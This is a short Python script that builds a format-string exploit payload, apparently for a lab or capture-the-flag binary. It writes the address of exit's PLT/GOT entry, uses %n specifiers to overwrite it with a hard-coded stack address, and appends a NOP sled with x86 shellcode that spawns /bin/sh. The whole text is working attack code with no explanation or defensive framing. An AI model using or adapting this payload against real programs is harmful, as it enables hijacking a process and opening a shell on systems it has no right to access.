import struct

EXIT_PLT = 0x80497e0

SHELLCODE_ADDR = 0xffffd6a0

least_addr = struct.pack('I', EXIT_PLT)
most_addr = struct.pack('I', EXIT_PLT + 2)

exploit = ""
exploit += least_addr
exploit += most_addr

exploit += b"%10$54972x"
exploit += b"%10$n "
exploit += b"%10$76090x"
exploit += b"%11$n "

exploit += '\x00'
exploit += b'\x90'*10
exploit += b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'

def pad(s):
	return s + b'A'*(100-len(s))

print pad(exploit)
